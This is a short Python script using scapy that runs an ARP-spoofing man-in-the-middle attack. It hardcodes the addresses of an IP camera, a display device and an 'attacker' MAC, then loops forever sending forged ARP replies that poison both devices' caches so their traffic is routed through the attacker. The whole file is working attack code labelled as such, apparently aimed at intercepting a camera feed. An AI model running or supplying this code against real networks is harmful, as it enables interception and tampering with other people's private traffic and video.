from scapy.all import Ether, ARP, sendp
import time
import sys


camera_ip = "192.168.0.81"

display_device_ip = "192.168.0.162"
display_device_mac = "58:1C:F8:51:BD:3C"

attacker_mac = "46:4C:D7:C3:7F:F1"

iface = "en0"   

arp_camera = Ether(src=attacker_mac, dst="ff:ff:ff:ff:ff:ff") / ARP(
    op="is-at",               
    hwsrc=attacker_mac,       
    psrc=display_device_ip,           
    hwdst="ff:ff:ff:ff:ff:ff", 
    pdst=camera_ip            
)

arp_victim = Ether(src=attacker_mac, dst=display_device_mac) / ARP(
    op="is-at",
    hwsrc=attacker_mac,
    psrc=camera_ip,           
    hwdst=display_device_mac,         
    pdst=display_device_ip            
)

print(f"[*] Starting ARP Spoofing on {iface}.")
try:
    while True:
        # Send ARP request to camera
        sendp(arp_camera, iface=iface, verbose=False) 
        # Send ARP request to client
        sendp(arp_victim, iface=iface, verbose=False) 
        time.sleep(3)
except KeyboardInterrupt:
    print("\n[*] Stopping attack...")
    sys.exit(0)